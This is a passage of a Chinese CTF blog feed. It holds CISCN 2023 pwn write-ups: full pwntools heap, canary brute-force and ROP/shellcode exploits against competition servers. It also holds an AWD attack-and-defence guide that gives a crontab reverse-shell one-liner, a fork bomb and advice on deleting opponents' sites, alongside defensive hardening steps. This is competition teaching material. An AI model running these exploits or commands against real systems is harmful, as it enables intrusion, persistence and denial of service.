  <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><p>程序使用了<code>fork</code>，所以在子进程中报错，不会使程序中断，所以爆破<code>canary</code>，然后跳转到后门位置就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Shell-We-Go"><a href="#Shell-We-Go" class="headerlink" title="Shell We Go"></a>Shell We Go</h2><p>当认证结束之后，执行<code>echo</code>指令，存在栈溢出，使用<code>+</code>可以跳过栈空间，直接覆盖返回值<br>构造<code>rop</code>，执行<code>orw</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> 导入xml</p><p>导出密文后异或得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ciscn/2023ciscn-reverse-babyre.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;签到卡&quot;&gt;&lt;a href=&quot;#签到卡&quot; class=&quot;headerlink&quot; title=&quot;签到卡&quot;&gt;&lt;/a&gt;签到</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="ciscn" scheme="https://www.lewiserii.top/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻击与防御</title>
    <link href="https://www.lewiserii.top/awd/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.html"/>
    <id>https://www.lewiserii.top/awd/AWD%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1.html</id>
    <published>2023-05-21T12:00:00.000Z</published>
    <updated>2023-06-10T12:48:34.083Z</updated>
    
    <content type="html"><![CDATA[<h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>如果官方没公开靶机地址（通常不会给），则攻击手首先要做的事就是先找到每个主机地址和端口</p><p>用工具或者自己的脚本都行，不过建议提前准备好脚本，现场写会慢一点可能还会出问题</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p><strong>ssh弱口令</strong><br>可能会有些队伍没有改</p><p><strong>web弱口令</strong><br>一般在后台登录处，或者phpmyadmin之类的服务</p><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>代码审计是攻防一体的工作，当发现漏洞时，进攻的同时跟防守的队友商讨如何修复</p><p><strong>预留后门</strong><br>某些地市级awd比赛为了降低难度一般会设置一句话木马，注意第一时间删除然后用脚本去批量打其他主机</p><p><strong>其他漏洞</strong></p><p>将源码下载到本地，先用D盾或者河马等扫描工具大概扫描下，在深入挖掘漏洞</p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p><strong>不死马</strong></p><p>参考文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p><p><strong>内核漏洞提权</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure><p><strong>crontab写定时任务</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//每分钟反弹shell到 127.0.0.1的5353端口<br>(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/5353 0&gt;&amp;1&#x27;\n&quot;</span>)|crontab -<br></code></pre></td></tr></table></figure><h2 id="搅屎"><a href="#搅屎" class="headerlink" title="搅屎"></a>搅屎</h2><p>1：到最后一轮时，该拿完的flag拿到时可以进行删站，无限复制等操作</p><p>2：fork炸弹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##!/bin/sh</span><br>/bin/echo <span class="hljs-string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><h2 id="web防御"><a href="#web防御" class="headerlink" title="web防御"></a>web防御</h2><h4 id="ssh登录"><a href="#ssh登录" class="headerlink" title="ssh登录"></a>ssh登录</h4><p>ssh命令登录或者使用图形化工具连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">//ssh连接<br>ssh -p 2222 ctf@xx.xx.xx.xx<br><br>//免密登录<br>ssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx<br></code></pre></td></tr></table></figure><h4 id="备份源码"><a href="#备份源码" class="headerlink" title="备份源码"></a>备份源码</h4><p>比赛一开始就需要有一个队友对网站源码和数据库数据进行备份，如果后续被删站了可以及时恢复</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##网址备份</span><br>tar -zcvf web.tar.gz /var/www/html<br><br><span class="hljs-comment">##数据库备份-全部数据</span><br>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库备份-指定数据库和表</span><br>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql<br><span class="hljs-comment">##数据库恢复（mysql终端下执行）</span><br><span class="hljs-built_in">source</span> /tmp/db.sql<br></code></pre></td></tr></table></figure><h4 id="改密码"><a href="#改密码" class="headerlink" title="改密码"></a>改密码</h4><p><strong>ssh密码</strong><br>如果发现拿到的ssh密码不是类似于<code>SDs2dKJaH5hs</code>的随机强口令，而是类似于<code>ctf/123456</code>，则需要更改ssh密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">passwd<br></code></pre></td></tr></table></figure><p><strong>web后台密码</strong><br>一般题目大概率是一个cms或者自己写的网站，那么后台就有可能存在弱口令，需要修改</p><p><strong>mysql密码</strong><br>mysql密码是很多队伍会忽略的地方，当然也同样重要。改完要注意cms中的配置文件，不然可能会导致cms连不上数据库而崩溃</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##方法一（mysql终端下执行）</span><br>show databases;<br>use mysql<br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@localhost = password(<span class="hljs-string">&#x27;123&#x27;</span>);<br><br><span class="hljs-comment">##方法二（mysql终端下执行）</span><br>update user <span class="hljs-built_in">set</span> password = PASSWORD(<span class="hljs-string">&#x27;需要更换的密码&#x27;</span>) <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush privileges;<br>show tables;<br><br><span class="hljs-comment">##方法三</span><br>mysqladmin -u用户名 -p旧密码 password 新密码<br></code></pre></td></tr></table></figure><h4 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h4><p>一般先用D盾，河马等工具扫一遍，发现一句话木马等较明显的漏洞，再用seay等或手动分析，或者可以找找历史漏洞cve等</p><p>找到漏洞后根据漏洞的种类进行修复</p><p>1：删站<br>不建议。如果参赛手册中没有明确禁止，这是最简单粗暴的姿势</p><p>2：删页面<br>只要删掉有漏洞的页面就行了，比如删后台登录页面、注册页面、上传页面等等</p><p>3：破坏正常功能<br>如果手册中规定了不能删除任何页面，则可以让这些漏洞点的功能函数失效</p><p>4：正常修补手段<br>如加白名单，字符过滤转义，设置open_basedir等，有权限还可以修改php.ini，改完记得重启</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">;禁用危险函数<br>disable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo<br><br>;预防sql注入<br>magic_quotes_gpc = on<br><br>;远程文件包含<br>allow_url_fopen = off<br>allow_url_include = off<br><br>;重启php服务<br>service php-fpm restart<br></code></pre></td></tr></table></figure><h4 id="上waf"><a href="#上waf" class="headerlink" title="上waf"></a>上waf</h4><p>waf也是比较重要的一点。一般可以分为两个类型，一种是只有监控的功能，可以监控流量方便分析其他队的payload，一般比赛的检查都能通过。另一种就是带拦截的防御waf，也称通防，一般比赛不允许使用</p><p>几个waf项目</p><p>1：AoiAWD<br>安恒维护的开源项目，需要提前在本机编译，支持web，pwn流量捕获，系统进程监控等<br>地址：<a href="https://github.com/DasSecurity-HatLab/AoiAWD">https://github.com/DasSecurity-HatLab/AoiAWD</a></p><p>2：watchbird<br>通防waf，支持流量转发和替换flag，防御注入，反序列化，rce等漏洞<br>地址：<a href="https://github.com/leohearts/awd-watchbird">https://github.com/leohearts/awd-watchbird</a></p><h4 id="shell查杀"><a href="#shell查杀" class="headerlink" title="shell查杀"></a>shell查杀</h4><p>对于不死马可以参考我以前写的一篇文章：<a href="https://www.lewiserii.top/awd/AWD%E4%B8%8D%E6%AD%BB%E9%A9%AC%E4%B8%8E%E5%85%8B%E5%88%B6%E6%96%B9%E6%B3%95.html">AWD不死马与克制方法</a></p><p>一些find命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##寻找最近20分钟修改过的文件</span><br>find /var/www/html -name *.php -mmin -20<br><br><span class="hljs-comment">##寻找行数最短的文件</span><br>find ./ -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs <span class="hljs-built_in">wc</span> -l | <span class="hljs-built_in">sort</span> -rg<br><br><span class="hljs-comment">##关键字查杀</span><br>find . -name <span class="hljs-string">&#x27;*.php&#x27;</span> | xargs grep -n <span class="hljs-string">&#x27;eval(&#x27;</span><br></code></pre></td></tr></table></figure><p>查看进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -nlpt<br>ps -<span class="hljs-built_in">df</span><br>top<br></code></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">kill</span> -9 PID<br>killall 名称<br></code></pre></td></tr></table></figure><h4 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h4><p>经过实践，发现别名似乎在网站上rce执行命令时并不会生效</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##修改cat的别名</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;echo `date`|md5sum|cut -d &#x27; &#x27; -f1||&quot;</span><br><span class="hljs-built_in">alias</span> <span class="hljs-built_in">cat</span>=<span class="hljs-string">&quot;printf &#x27;flag&#123;%s&#125;&#x27; <span class="hljs-subst">$(date | md5sum | cut -d &#x27; &#x27; -f1)</span>&quot;</span><br><br><br><span class="hljs-comment">##去除别名</span><br><span class="hljs-built_in">unalias</span> -a<br></code></pre></td></tr></table></figure><h2 id="pwn防御"><a href="#pwn防御" class="headerlink" title="pwn防御"></a>pwn防御</h2><h4 id="打patch"><a href="#打patch" class="headerlink" title="打patch"></a>打patch</h4><p>参考：<a href="https://q1iq.top/IDA-patch">https://q1iq.top/IDA-patch</a></p><h4 id="上通防"><a href="#上通防" class="headerlink" title="上通防"></a>上通防</h4><p>现在大部分比赛不允许上通防，因为通防基本可以实现完美防御</p><p>通防是通用防御的简称。因为awd里pwn题的形式基本都是运行一个二进制，然后把二进制的流量转发到某个端口，所以如果给这个pwn题加个壳子过滤一下流量，所有带flag的字符串都不允许输出，所有带flag的文件都不允许打开，基本上就没办法攻击了。</p><p>以下是几个通防项目</p><p><a href="https://github.com/rip1s/PwnSandboxForCTF">PwnSandboxForCTF</a>：Ptrace，劫持敏感syscall，检查参数过滤敏感字符串</p><p><a href="https://github.com/TTY-flag/evilPatcher">evilPatcher</a>：Seccomp沙盒，劫持syscall，无法过滤指针类参数</p><p><a href="https://github.com/I0gan/pwn_waf">pwn_waf</a>：抓取流量、通防、转发、多人转发模式，</p><p><a href="https://lief-project.github.io/download/">LIEF</a>：劫持敏感函数调用，过滤敏感字符串等。对原文件改动较小</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;攻击&quot;&gt;&lt;a href=&quot;#攻击&quot; class=&quot;headerlink&quot; title=&quot;攻击&quot;&gt;&lt;/a&gt;攻击&lt;/h1&gt;&lt;h2 id=&quot;主机发现&quot;&gt;&lt;a href=&quot;#主机发现&quot; class=&quot;headerlink&quot; title=&quot;主机发现&quot;&gt;&lt;/a&gt;主机发现&lt;/h</summary>
      
    
    
    
    <category term="awd" scheme="https://www.lewiserii.top/categories/awd/"/>
    
    
    <category term="awd" scheme="https://www.lewiserii.top/tags/awd/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>2023宁波市赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2023%E5%AE%81%E6%B3%A2%E5%B8%82%E8%B5%9Bwp.html</id>
    <published>2023-05-20T06:00:00.000Z</published>
    <updated>2023-05-25T16:03:28.603Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h2><p>sqlmap一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2023nsctf/Query.png"></p><h2 id="Deserialization"><a href="#Deserialization" class="headerlink" title="Deserialization"></a>Deserialization</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//The location of the flag is at route.php</span><br><span class="hljs-variable">$read</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;read&quot;</span>];<br><span class="hljs-variable">$input</span> = <span 